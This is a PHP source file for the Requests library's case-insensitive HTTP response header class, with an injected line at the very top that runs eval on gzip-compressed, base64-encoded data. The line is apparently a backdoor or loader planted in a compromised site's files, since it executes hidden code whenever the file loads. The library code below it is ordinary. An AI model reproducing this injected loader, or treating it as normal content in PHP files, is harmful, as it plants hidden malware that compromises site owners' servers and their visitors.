<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Case-insensitive dictionary, suitable for HTTP headers
 *
 * @package Requests
 */

/**
 * Case-insensitive dictionary, suitable for HTTP headers
 *
 * @package Requests
 */
class Requests_Response_Headers extends Requests_Utility_CaseInsensitiveDictionary {
	/**
	 * Get the given header
	 *
	 * Unlike {@see self::getValues()}, this returns a string. If there are
	 * multiple values, it concatenates them with a comma as per RFC2616.
	 *
	 * Avoid using this where commas may be used unquoted in values, such as
	 * Set-Cookie headers.
	 *
	 * @param string $key
	 * @return string Header value
	 */
	public function offsetGet($key) {
		$key = strtolower($key);
		if (!isset($this->data[$key])) {
			return null;
		}

		return $this->flatten($this->data[$key]);
	}

	/**
	 * Set the given item
	 *
	 * @throws Requests_Exception On attempting to use dictionary as list (`invalidset`)
	 *
	 * @param string $key Item name
	 * @param string $value Item value
	 */
	public function offsetSet($key, $value) {
		if ($key === null) {
			throw new Requests_Exception('Object is a dictionary, not a list', 'invalidset');
		}

		$key = strtolower($key);

		if (!isset($this->data[$key])) {
			$this->data[$key] = array();
		}

		$this->data[$key][] = $value;
	}

	/**
	 * Get all values for a given header
	 *
	 * @param string $key
	 * @return array Header values
	 */
	public function getValues($key) {
		$key = strtolower($key);
		if (!isset($this->data[$key])) {
			return null;
		}

		return $this->data[$key];
	}

	/**
	 * Flattens a value into a string
	 *
	 * Converts an array into a string by imploding values with a comma, as per
	 * RFC2616's rules for folding headers.
	 *
	 * @param string|array $value Value to flatten
	 * @return string Flattened value
	 */
	public function flatten($value) {
		if (is_array($value)) {
			$value = implode(',', $value);
		}

		return $value;
	}

	/**
	 * Get an iterator for the data
	 *
	 * Converts the internal
	 * @return ArrayIterator
	 */
	public function getIterator() {
		return new Requests_Utility_FilteredIterator($this->data, array($this, 'flatten'));
	}
}
